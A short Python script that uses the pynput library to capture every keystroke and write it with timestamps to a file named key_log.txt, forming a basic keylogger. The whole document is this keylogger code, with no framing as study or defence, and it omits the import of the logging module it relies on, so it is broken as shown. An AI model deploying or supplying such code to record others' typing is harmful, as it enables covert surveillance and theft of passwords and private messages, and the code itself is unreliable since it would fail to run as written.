
from pynput.keyboard import Key, Listener

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
